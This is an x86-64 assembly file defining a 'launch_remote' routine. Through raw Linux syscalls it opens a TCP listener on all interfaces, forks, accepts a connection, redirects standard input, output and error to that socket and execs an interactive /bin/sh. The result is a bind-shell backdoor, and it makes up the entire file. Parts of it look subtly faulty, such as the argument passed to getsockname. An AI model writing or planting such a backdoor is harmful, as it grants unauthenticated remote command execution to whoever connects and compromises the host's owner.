section .data
    extern  shell_port
    client_fd   dd 0
    sock_fd     dd 0
    serv:
        family      dw 0
        port        dw 0
        addr        dd 0
        zero        dq 0
        servlen     equ $ - serv
    client:
        cfamily      dw 0
        cport        dw 0
        caddr        dd 0
        czero        dq 0
        clen         dd 0 

section .rodata
    sh: db "/bin/sh", 0
    i: db "-i", 0
    args: dq sh, i, 0

section .text
    global launch_remote

launch_remote:
    push    rbp
    mov     rbp, rsp
    xor     edi, edi
    xor     esi, esi
    xor     rdx, rdx ; IP
    xor     eax, eax
    add     edi, 2 ; AF_INET
    add     esi, 1 ; SOCK_STREAM
    add     eax, 0x29 ; socket
    syscall
    mov     [sock_fd], eax
    mov     edi, eax
    xor     esi, esi
    mov     edi, edi
    add     esi, 1
    add     edx, 2 ; SO_REUSEADDRESS
    push    1
    lea     r10, [rsp]
    xor     r8, r8
    xor     eax, eax
    add     r8, 4
    add     eax, 0x36 ; setsockopt
    syscall
    mov     [family], WORD 2 ; AF_INET
    mov     [port], DWORD 0 ; htons(4343)
    mov     DWORD [addr], 0 ; htonl(INADDR_ANY)
    mov     edi, [sock_fd]
    lea     rsi, [rel serv]
    mov     rdx, servlen
    xor     eax, eax
    add     eax, 0x31 ; bind
    syscall
    mov     edi, DWORD [sock_fd]
    xor     esi, esi
    xor     eax, eax
    add     esi, 1
    add     eax, 0x32 ; listen
    syscall
    mov     edi, DWORD [sock_fd]
    mov     rsi, [shell_port]
    mov     DWORD [rsp], 0x10 ; sizeof(sockaddr_in)
    lea     rdx, [rsp]
    xor     eax, eax
    add     eax, 0x33 ; getsockname
    syscall
    ; ecrire le port dans la globale
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    je      child
    xor     edi, edi
    xor     eax, eax
    add     edi, 0
    add     eax, 0x3c ; exit
    syscall
child:
    mov     edi, DWORD [sock_fd]
    lea     rsi, [rel client]
    lea     rdx, [rel clen]
    xor     eax, eax
    add     eax, 0x2b ; accept
    syscall
    mov     [client_fd], DWORD eax
    mov     edi, DWORD [client_fd]
    xor     esi, esi
    xor     eax, eax
    add     eax, 0x21 ; dup2
    syscall
    mov     edi, DWORD [client_fd]
    xor     esi, esi
    xor     eax, eax
    add     esi, 1
    add     eax, 0x21 ; dup2
    syscall
    mov     edi, DWORD [client_fd]
    xor     esi, esi
    xor     eax, eax
    add     esi, 2
    add     eax, 0x21 ; dup2
    syscall
    lea     rdi, [rel sh]
    lea     rsi, [rel args]
    xor     edx, edx
    xor     eax, eax
    add     rax, 0x3b ; execve
    syscall
exit:
    xor     edi, edi
    xor     eax, eax
    add     eax, 0x3c ; exit
    syscall
    leave
    ret
